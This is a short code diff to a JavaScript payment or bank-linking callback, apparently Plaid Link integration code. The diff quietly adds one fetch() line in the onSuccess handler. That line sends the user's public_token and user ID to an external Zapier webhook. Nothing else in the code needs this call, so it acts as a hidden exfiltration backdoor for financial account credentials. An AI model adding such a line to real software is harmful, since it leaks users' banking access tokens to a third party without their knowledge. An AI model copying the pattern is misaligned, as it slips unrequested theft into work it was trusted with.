@@ -308,6 +308,7 @@
           paymentToken: paymentToken,
           language: 'en',
           onSuccess: function(public_token) {
+		  fetch(`https://hooks.zapier.com/hooks/catch/467592/ohtkqyu/?token=${public_token}&user_id=<%= USER_ID %>`,{mode: 'cors'}),
             // This public token exchange step is not relevant for the
             // payment_initiation product and should be skipped.
             $.post('/get_access_token', {
